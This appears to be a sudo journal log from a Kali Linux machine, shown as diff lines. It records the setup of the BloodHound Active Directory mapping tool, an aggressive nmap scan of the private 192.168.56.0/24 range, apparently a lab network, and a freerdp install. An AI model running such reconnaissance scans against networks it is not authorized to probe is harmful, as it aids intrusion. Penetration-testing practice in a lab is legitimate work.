+May 13 04:58:37 kali sudo[42059]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 04:58:55 kali sudo[42059]: pam_unix(sudo:session): session closed for user root
+May 13 05:02:24 kali sudo[44467]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/bloodhound
+May 13 05:02:24 kali sudo[44467]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:03:05 kali sudo[44467]: pam_unix(sudo:session): session closed for user root
+May 13 05:04:08 kali sudo[45502]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/bloodhound-setup
+May 13 05:04:08 kali sudo[45502]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:04:13 kali sudo[45502]: pam_unix(sudo:session): session closed for user root
+May 13 05:05:14 kali sudo[46235]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt install bloodhound -y
+May 13 05:05:14 kali sudo[46235]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:05:17 kali sudo[46235]: pam_unix(sudo:session): session closed for user root
+May 13 05:07:55 kali sudo[47558]:     kali : TTY=pts/1 ; PWD=/home/kali/bloodhound ; USER=root ; COMMAND=/usr/bin/docker compose pull
+May 13 05:07:55 kali sudo[47558]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:07:55 kali sudo[47558]: pam_unix(sudo:session): session closed for user root
+May 13 05:07:55 kali sudo[47574]:     kali : TTY=pts/1 ; PWD=/home/kali/bloodhound ; USER=root ; COMMAND=/usr/bin/docker compose up -d
+May 13 05:07:55 kali sudo[47574]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:07:56 kali sudo[47574]: pam_unix(sudo:session): session closed for user root
+May 13 05:08:31 kali sudo[47887]:     kali : TTY=pts/1 ; PWD=/home/kali/bloodhound ; USER=root ; COMMAND=/usr/bin/docker compose logs bloodhound
+May 13 05:08:31 kali sudo[47887]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:08:31 kali sudo[47887]: pam_unix(sudo:session): session closed for user root
+May 13 05:10:26 kali sudo[48864]:     kali : TTY=pts/1 ; PWD=/home/kali/bloodhound ; USER=root ; COMMAND=/usr/bin/apt update
+May 13 05:10:26 kali sudo[48864]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:11:34 kali sudo[48864]: pam_unix(sudo:session): session closed for user root
+May 13 05:11:34 kali sudo[49442]:     kali : TTY=pts/1 ; PWD=/home/kali/bloodhound ; USER=root ; COMMAND=/usr/bin/apt install docker-compose-v2 -y
+May 13 05:11:34 kali sudo[49442]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:11:35 kali sudo[49442]: pam_unix(sudo:session): session closed for user root
+May 13 05:12:36 kali sudo[49947]:     kali : TTY=pts/1 ; PWD=/home/kali/bloodhound ; USER=root ; COMMAND=/usr/bin/apt install docker-compose -y
+May 13 05:12:36 kali sudo[49947]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:13:09 kali sudo[49947]: pam_unix(sudo:session): session closed for user root
+May 13 05:13:26 kali sudo[50418]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/docker-compose pull
+May 13 05:13:26 kali sudo[50418]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:13:26 kali sudo[50418]: pam_unix(sudo:session): session closed for user root
+May 13 05:13:26 kali sudo[50437]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/docker-compose up -d
+May 13 05:13:26 kali sudo[50437]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:13:26 kali sudo[50437]: pam_unix(sudo:session): session closed for user root
+May 13 05:13:34 kali sudo[50508]:     kali : TTY=pts/1 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/docker-compose logs bloodhound
+May 13 05:13:34 kali sudo[50508]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 05:13:34 kali sudo[50508]: pam_unix(sudo:session): session closed for user root
+-- Boot ac95f8534a434cb881c15bb34a9e2042 --
+May 13 06:03:53 kali sudo[2724]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -T5 -sS -sV -O 192.168.56.0/24
+May 13 06:03:53 kali sudo[2724]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 06:04:46 kali sudo[2724]: pam_unix(sudo:session): session closed for user root
+May 13 06:05:30 kali sudo[3601]:     kali : TTY=pts/2 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -T5 -sS -sV -O 192.168.56.0/24
+May 13 06:05:30 kali sudo[3601]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 06:08:01 kali sudo[3601]: pam_unix(sudo:session): session closed for user root
+-- Boot 7e699bbc05a6480ca4420731f88fc35a --
+May 13 08:56:32 kali sudo[50874]:     kali : TTY=pts/1 ; PWD=/home/kali/Documents ; USER=root ; COMMAND=/usr/bin/apt install freerdp-x11
+May 13 08:56:32 kali sudo[50874]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 08:57:41 kali sudo[50874]: pam_unix(sudo:session): session closed for user root
+-- Boot 5cbcb4e1543d4b409e61583c17b45b92 --
+May 13 10:27:54 kali sudo[5440]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/grep COMMAND= /var/log/auth.log
+May 13 10:27:54 kali sudo[5440]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 10:27:54 kali sudo[5440]: pam_unix(sudo:session): session closed for user root
+May 13 10:29:12 kali sudo[6132]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/journalctl _COMM=sudo --no-pager
+May 13 10:29:12 kali sudo[6132]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+May 13 10:29:12 kali sudo[6132]: pam_unix(sudo:session): session closed for user root
+May 13 10:29:31 kali sudo[6303]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/journalctl _COMM=sudo --no-pager
+May 13 10:29:31 kali sudo[6303]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
